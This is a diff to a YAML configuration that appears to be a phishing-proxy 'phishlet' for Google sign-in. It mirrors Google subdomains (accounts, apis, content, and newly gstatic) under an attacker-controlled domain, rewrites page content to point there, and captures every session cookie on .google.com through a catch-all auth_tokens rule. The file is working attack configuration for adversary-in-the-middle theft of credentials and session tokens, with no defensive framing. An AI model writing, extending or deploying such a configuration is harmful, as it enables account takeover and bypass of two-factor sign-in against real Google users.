@@ -8,6 +8,7 @@ proxy_hosts:
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
 sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
@@ -15,6 +16,8 @@ sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'apis.google.com', replace: 'apis.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.google.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'google.com', search: 'gstatic.com', replace: 'gstatic.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'gstatic.com', orig_sub: '', domain: 'google.com', search: 'gstatic.com', replace: 'gstatic.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 auth_tokens:
   - domain: '.google.com'
     keys: [".*,regexp"]
